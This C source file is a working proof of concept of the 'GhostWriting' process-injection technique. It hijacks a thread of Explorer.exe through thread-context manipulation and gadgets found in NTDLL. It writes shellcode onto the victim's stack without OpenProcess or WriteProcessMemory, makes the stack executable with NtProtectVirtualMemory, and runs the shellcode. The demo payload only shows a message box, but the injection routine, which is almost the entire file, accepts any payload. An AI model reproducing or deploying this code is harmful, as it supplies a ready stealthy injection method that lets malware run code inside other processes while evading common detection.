// GhostWriting Technique Implementation
// Original concept by c0de90e7, Spring 2007
//
// A paradox: Writing to another process without opening it nor actually writing to it
// - No OpenProcess
// - No WriteProcessMemory
// - Uses thread context manipulation + MOV gadgets to write memory

#include <windows.h>
#include <stdio.h>

HWND WINAPI GetShellWindow(void);

// Injection shellcode that will be executed in the target process
// This code calls MessageBoxA and then returns to ESI (which points to JMP $)
UCHAR InjectionCode[] = {
    0x6A, 0x00,                      // PUSH 0
    0xE8, 0x0D, 0x00, 0x00, 0x00,    // CALL NEXT
    // Caption text
    'G', 'h', 'o', 's', 't', 'W', 'r', 'i', 't', 'i', 'n', 'g', 0x00,
    0xE8, 0x1D, 0x00, 0x00, 0x00,    // CALL NEXT
    // Message text
    'R', 'u', 'n', 'n', 'i', 'n', 'g', ' ', 'i', 'n', 't', 'o', ' ', 'E', 'X', 'P', 'L', 'O', 'R', 'E', 'R', '.', 'E', 'X', 'E', '.', '.', '.', 0x00,
    0x6A, 0x00,                      // PUSH 0
    0x56,                            // PUSH ESI (return address, ESI points to JMP $)
    0x68, 0x00, 0x00, 0x00, 0x00,    // PUSH MessageBoxA (will be patched at runtime)
    0xC3                             // RET
};

// Wait for thread to reach the auto-lock point (JMP $ gadget)
void WaitForThreadAutoLock(HANDLE Thread, CONTEXT* PThreadContext, HWND ThreadsWindow, DWORD AutoLockTargetEIP) {
    SetThreadContext(Thread, PThreadContext);

    // Post messages to wake the thread if it's waiting
    PostMessage(ThreadsWindow, WM_USER, 0, 0);
    PostMessage(ThreadsWindow, WM_USER, 0, 0);
    PostMessage(ThreadsWindow, WM_USER, 0, 0);

    do {
        ResumeThread(Thread);
        Sleep(30);  // Small delay to let thread execute
        SuspendThread(Thread);
        GetThreadContext(Thread, PThreadContext);
    } while (PThreadContext->Eip != AutoLockTargetEIP);
}

// Disassemble and validate a MOV [REG1],REG2 or MOV [REG1+xx],REG2 instruction
// Returns TRUE if the instruction is valid for our purposes
int DisassembleAndValidateMOV(PUCHAR InstructionMemoryBase, ULONG* InstructionMemoryIndex,
                               CONTEXT* PThreadContextBase, DWORD** WritePointer,
                               DWORD** WriteItem, int* MOVRETOffsetFromMemoryRegister) {
    UCHAR WritePointerRegIndex, WriteItemRegIndex, ModRM;
    DWORD* ArrayOfValidRegisterAddressesInContext[8];

    // Valid non-volatile registers (EBX, EBP, ESI, EDI)
    ArrayOfValidRegisterAddressesInContext[0] = NULL;                          // EAX
    ArrayOfValidRegisterAddressesInContext[1] = NULL;                          // ECX
    ArrayOfValidRegisterAddressesInContext[2] = NULL;                          // EDX
    ArrayOfValidRegisterAddressesInContext[3] = &PThreadContextBase->Ebx;      // EBX
    ArrayOfValidRegisterAddressesInContext[4] = NULL;                          // ESP
    ArrayOfValidRegisterAddressesInContext[5] = &PThreadContextBase->Ebp;      // EBP
    ArrayOfValidRegisterAddressesInContext[6] = &PThreadContextBase->Esi;      // ESI
    ArrayOfValidRegisterAddressesInContext[7] = &PThreadContextBase->Edi;      // EDI

    if (InstructionMemoryBase[*InstructionMemoryIndex] == 0x89) {  // MOV /r instruction
        ModRM = InstructionMemoryBase[*InstructionMemoryIndex + 1];

        if ((ModRM & 0x80) != 0)  // Mod field must be 00 or 01
            return FALSE;

        WritePointerRegIndex = ModRM & 0x07;           // Destination register
        WriteItemRegIndex = (ModRM >> 3) & 0x07;       // Source register

        if (WritePointerRegIndex == WriteItemRegIndex)  // Registers must be different
            return FALSE;

        if ((ModRM & 0x40) == 0) {  // Mod == 00: MOV [REG1],REG2
            if (WritePointerRegIndex == 5)  // Special case: [EBP] becomes [immediate32]
                return FALSE;

            *MOVRETOffsetFromMemoryRegister = 0;
            *InstructionMemoryIndex += 2;
        } else {  // Mod == 01: MOV [REG1+xx],REG2
            *MOVRETOffsetFromMemoryRegister = (signed char)InstructionMemoryBase[*InstructionMemoryIndex + 2];
            *InstructionMemoryIndex += 3;
        }

        // Check if registers are valid
        if ((ArrayOfValidRegisterAddressesInContext[WritePointerRegIndex] != NULL) &&
            (ArrayOfValidRegisterAddressesInContext[WriteItemRegIndex] != NULL)) {
            *WritePointer = ArrayOfValidRegisterAddressesInContext[WritePointerRegIndex];
            *WriteItem = ArrayOfValidRegisterAddressesInContext[WriteItemRegIndex];
        } else {
            return FALSE;
        }

        return TRUE;
    }

    return FALSE;
}

// Core injection routine
int Inject(HANDLE Thread, DWORD* InjectionCode, ULONG NumberOfDWORDsToInject, HWND ThreadsWindow) {
    CONTEXT SavedThreadContext;
    CONTEXT WorkingThreadContext;
    DWORD* WritePointer;
    DWORD* WriteItem;
    DWORD JMPTOSELFAddress, MOVRETAddress;
    int MOVRETOffsetFromMemoryRegister;
    ULONG NumberOfBytesToPopAfterMOVBeforeRET;
    DWORD BASEOfWrittenBytes, DWORDWritingPointer;
    DWORD InjectedCodeExecutionStart;
    DWORD NtProtectVirtualMemoryAddress;

    // NtProtectVirtualMemory call frame
    DWORD NtProtectVirtualMemoryCallFrame[1+5+3] = {
        0,                        // Return address (will point to JMP $)
        0xFFFFFFFF,               // ProcessHandle (current process)
        0,                        // Pointer to BaseAddress
        0,                        // Pointer to NumberOfBytesToProtect
        PAGE_EXECUTE_READWRITE,   // NewAccessProtection
        0,                        // Pointer to OldAccessProtection
        0,                        // BaseAddress
        0,                        // NumberOfBytesToProtect
        0                         // OldAccessProtection
    };

    HMODULE NTDLLBase;
    PUCHAR NTDLLCode;
    PIMAGE_NT_HEADERS NTDLLPEHeader;
    ULONG NTDLLCodeSize, i, j, k;

    // Get NTDLL base and NtProtectVirtualMemory address
    NTDLLBase = GetModuleHandle("NTDLL.DLL");
    NtProtectVirtualMemoryAddress = (DWORD)GetProcAddress(NTDLLBase, "NtProtectVirtualMemory");

    // Get NTDLL code section
    NTDLLCode = (PUCHAR)((ULONG)NTDLLBase + 0x00001000);
    NTDLLPEHeader = (PIMAGE_NT_HEADERS)((ULONG)NTDLLBase + ((IMAGE_DOS_HEADER*)NTDLLBase)->e_lfanew);
    NTDLLCodeSize = NTDLLPEHeader->OptionalHeader.SizeOfCode;

    JMPTOSELFAddress = MOVRETAddress = (DWORD)NULL;
    i = 0;

    // Search for gadgets: "JMP $" (0xEB 0xFE) and "MOV [REG1],REG2" + "RET"
    while ((i < NTDLLCodeSize) && ((!JMPTOSELFAddress) || (!MOVRETAddress))) {
        if (!JMPTOSELFAddress) {
            if ((NTDLLCode[i] == 0xEB) && (NTDLLCode[i+1] == 0xFE)) {
                JMPTOSELFAddress = (DWORD)&NTDLLCode[i];
                i += 1;
            }
        }

        if (!MOVRETAddress) {
            if (DisassembleAndValidateMOV(NTDLLCode, &i, &WorkingThreadContext,
                                          &WritePointer, &WriteItem, &MOVRETOffsetFromMemoryRegister)) {
                j = i;
                k = 0;

                // Look for POP/ADD instructions before RET (within 16 bytes)
                while (j < i + 16) {
                    if (((NTDLLCode[j] & 0xF8) == 0x58) && (NTDLLCode[j] != 0x5C)) {  // POP REGx
                        k += 4;
                        j += 1;
                        continue;
                    }

                    if ((NTDLLCode[j] == 0x83) && ((NTDLLCode[j+1] & 0xF8) == 0xC0)) {  // ADD REGx,yy
                        if (NTDLLCode[j+1] == 0xC4)  // ADD ESP,yy
                            k += (signed char)NTDLLCode[j+2];
                        j += 3;
                        continue;
                    }

                    if ((NTDLLCode[j] == 0xC3) || ((NTDLLCode[j] == 0xC2) && (NTDLLCode[j+2] == 0x00))) {  // RET or RET n
                        if (MOVRETOffsetFromMemoryRegister == 0)
                            MOVRETAddress = (DWORD)&NTDLLCode[i-2];
                        else
                            MOVRETAddress = (DWORD)&NTDLLCode[i-3];

                        NumberOfBytesToPopAfterMOVBeforeRET = k;
                        i = j + 3;
                        break;
                    }

                    break;
                }
            }
        }

        i++;
    }

    if ((!JMPTOSELFAddress) || (!MOVRETAddress)) {
        printf("Failed to find required gadgets\n");
        return FALSE;
    }

    printf("[+] Found JMP $ gadget at 0x%08lX\n", JMPTOSELFAddress);
    printf("[+] Found MOV+RET gadget at 0x%08lX\n", MOVRETAddress);

    // Suspend target thread
    SuspendThread(Thread);

    SavedThreadContext.ContextFlags = CONTEXT_FULL;
    WorkingThreadContext.ContextFlags = CONTEXT_FULL;

    GetThreadContext(Thread, &SavedThreadContext);
    GetThreadContext(Thread, &WorkingThreadContext);

    // Calculate stack space needed
    BASEOfWrittenBytes = WorkingThreadContext.Esp -
        ((NumberOfDWORDsToInject * sizeof(DWORD)) +
         ((1+5+3) * sizeof(DWORD)) +
         sizeof(DWORD) +
         NumberOfBytesToPopAfterMOVBeforeRET);

    // Initialize registers for first write
    *WritePointer = BASEOfWrittenBytes - MOVRETOffsetFromMemoryRegister + NumberOfBytesToPopAfterMOVBeforeRET;
    WorkingThreadContext.Esp = BASEOfWrittenBytes;
    WorkingThreadContext.Eip = MOVRETAddress;
    *WriteItem = JMPTOSELFAddress;

    // Write first return address (JMP $ address)
    WaitForThreadAutoLock(Thread, &WorkingThreadContext, ThreadsWindow, JMPTOSELFAddress);

    // Setup NtProtectVirtualMemory call frame pointers
    NtProtectVirtualMemoryCallFrame[0] = JMPTOSELFAddress;
    NtProtectVirtualMemoryCallFrame[2] = BASEOfWrittenBytes + NumberOfBytesToPopAfterMOVBeforeRET + sizeof(DWORD) + ((1+5+0) * sizeof(DWORD));
    NtProtectVirtualMemoryCallFrame[3] = BASEOfWrittenBytes + NumberOfBytesToPopAfterMOVBeforeRET + sizeof(DWORD) + ((1+5+1) * sizeof(DWORD));
    NtProtectVirtualMemoryCallFrame[5] = BASEOfWrittenBytes + NumberOfBytesToPopAfterMOVBeforeRET + sizeof(DWORD) + ((1+5+2) * sizeof(DWORD));
    NtProtectVirtualMemoryCallFrame[6] = BASEOfWrittenBytes + NumberOfBytesToPopAfterMOVBeforeRET + sizeof(DWORD) + ((1+5+3) * sizeof(DWORD));
    NtProtectVirtualMemoryCallFrame[7] = NumberOfDWORDsToInject * sizeof(DWORD);

    // Write NtProtectVirtualMemory call frame (9 DWORDs)
    DWORDWritingPointer = BASEOfWrittenBytes + NumberOfBytesToPopAfterMOVBeforeRET + sizeof(DWORD);

    for (i = 0; i < 9; i++) {
        WorkingThreadContext.Esp = BASEOfWrittenBytes;
        *WritePointer = DWORDWritingPointer - MOVRETOffsetFromMemoryRegister;
        *WriteItem = NtProtectVirtualMemoryCallFrame[i];
        WorkingThreadContext.Eip = MOVRETAddress;

        WaitForThreadAutoLock(Thread, &WorkingThreadContext, ThreadsWindow, JMPTOSELFAddress);

        DWORDWritingPointer += sizeof(DWORD);
    }

    printf("[+] Wrote NtProtectVirtualMemory call frame\n");

    // Write injection code DWORD by DWORD
    InjectedCodeExecutionStart = DWORDWritingPointer;

    for (i = 0; i < NumberOfDWORDsToInject; i++) {
        WorkingThreadContext.Esp = BASEOfWrittenBytes;
        *WritePointer = DWORDWritingPointer - MOVRETOffsetFromMemoryRegister;
        *WriteItem = InjectionCode[i];
        WorkingThreadContext.Eip = MOVRETAddress;

        WaitForThreadAutoLock(Thread, &WorkingThreadContext, ThreadsWindow, JMPTOSELFAddress);

        DWORDWritingPointer += sizeof(DWORD);
    }

    printf("[+] Wrote injection code (%lu bytes)\n", NumberOfDWORDsToInject * 4);

    // Execute NtProtectVirtualMemory to mark stack as executable
    WorkingThreadContext.Esp = BASEOfWrittenBytes + NumberOfBytesToPopAfterMOVBeforeRET + sizeof(DWORD);
    WorkingThreadContext.Eip = NtProtectVirtualMemoryAddress;

    WaitForThreadAutoLock(Thread, &WorkingThreadContext, ThreadsWindow, JMPTOSELFAddress);

    printf("[+] Marked memory as PAGE_EXECUTE_READWRITE\n");

    // Execute injected code
    WorkingThreadContext.Esp = BASEOfWrittenBytes;
    WorkingThreadContext.Esi = JMPTOSELFAddress;
    WorkingThreadContext.Ebx = BASEOfWrittenBytes;
    WorkingThreadContext.Eip = InjectedCodeExecutionStart;

    WaitForThreadAutoLock(Thread, &WorkingThreadContext, ThreadsWindow, JMPTOSELFAddress);

    printf("[+] Executed injected code\n");

    // Restore thread context
    SetThreadContext(Thread, &SavedThreadContext);
    ResumeThread(Thread);

    PostMessage(ThreadsWindow, WM_USER, 0, 0);

    return TRUE;
}

int main(void) {
    HWND ShellWindowHandle;
    DWORD ShellWindowThread;
    HANDLE VictimThreadHandle;

    printf("=== GhostWriting Technique ===\n");
    printf("Writing to process without OpenProcess/WriteProcessMemory\n\n");

    // Get MessageBoxA address and patch injection code
    HMODULE USER32Base = LoadLibrary("USER32.DLL");
    DWORD MessageBoxAAddress = (DWORD)GetProcAddress(USER32Base, "MessageBoxA");
    FreeLibrary(USER32Base);

    *(DWORD*)(&InjectionCode[58]) = MessageBoxAAddress;

    // Get victim thread (Explorer.exe shell window thread)
    ShellWindowHandle = GetShellWindow();
    if (!ShellWindowHandle) {
        printf("[-] Failed to get shell window\n");
        return 1;
    }

    ShellWindowThread = GetWindowThreadProcessId(ShellWindowHandle, NULL);

    VictimThreadHandle = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,
                                     FALSE, ShellWindowThread);
    if (!VictimThreadHandle) {
        printf("[-] Failed to open thread (error: %lu)\n", GetLastError());
        return 1;
    }

    printf("[+] Target thread: %lu\n", ShellWindowThread);

    // Perform injection
    if (Inject(VictimThreadHandle, (DWORD*)InjectionCode, (sizeof(InjectionCode) + 4) / 4, ShellWindowHandle)) {
        printf("\n[+] SUCCESS! MessageBox should appear from Explorer.exe\n");
    } else {
        printf("\n[-] FAILURE!\n");
    }

    CloseHandle(VictimThreadHandle);
    return 0;
}
